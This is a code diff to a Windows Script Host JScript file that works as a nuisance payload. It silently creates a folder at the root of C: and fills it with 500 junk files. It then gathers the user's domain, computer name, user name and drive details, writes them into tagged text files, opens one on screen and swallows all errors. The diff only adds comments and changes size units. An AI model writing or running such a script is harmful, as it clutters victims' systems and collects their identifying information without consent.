@@ -27,6 +27,7 @@ function getusername() {
     var jkv = "Domain= " + WshNetwork.UserDomain() + "\nComputerName= " + WshNetwork.ComputerName + "\nUserName= " + WshNetwork.UserName;
     return jkv;
 }
+// Core Start
 try {
     var a = fso.CreateFolder("c:\\Fuck");
     for (i = 0; i < 500; i++) {
@@ -34,16 +35,15 @@ try {
         var file = fso.Createtextfile("c:\\Fuck\\" + i + ".fuck.sb360")
     }
 } catch (e) { /* eat any errors */ }
-
 try {
     var drv, s = "";
     drv = fso.GetDrive(fso.GetDriveName("c:\\"));
     s += "Drive C:";
     s += drv.VolumeName + "\n";
-    s += "Total Space: " + drv.TotalSize / 1024 / 1024;
-    s += " Mb" + "\n";
-    s += "Free Space: " + drv.FreeSpace / 1024 / 1024;
-    s += " Mb" + "\n";
+    s += "Total Space: " + drv.TotalSize / 1024 / 1024 / 1024;
+    s += " Gb" + "\n";
+    s += "Free Space: " + drv.FreeSpace / 1024 / 1024 / 1024;
+    s += " Gb" + "\n";
     drv_d = fso.GetDrive(fso.GetDriveName("d:\\"));
     s += "Drive D:";
     s += drv_d.VolumeName + "\n";
@@ -53,7 +53,7 @@ try {
     s += " Mb" + "\n";
     var file2 = fso.Createtextfile("c:\\Fuck\\info.fuck.txt", true)
     // 填写数据
-    file2.WriteLine("Testing...");
+    file2.WriteLine("--Drives List Info--");
     // 增加1个空行
     file2.WriteBlankLines(1);
     // 填写
@@ -71,12 +71,14 @@ try {
         var file3 = fso.Createtextfile("c:\\Fuck\\info.txt", true)
         // 填写
         file3.Write(s);
-        // 增加1个空行
+        // 增加空行
         file3.WriteBlankLines(1);
         // 填写 ID
         file3.Write("id-sb360");
         // 关闭文件
         file3.Close();
+        // 显示信息
         shell.Run("c:\\Fuck\\info.txt")
     }
 } catch (e) { /* eat any errors */ }
+// Core End
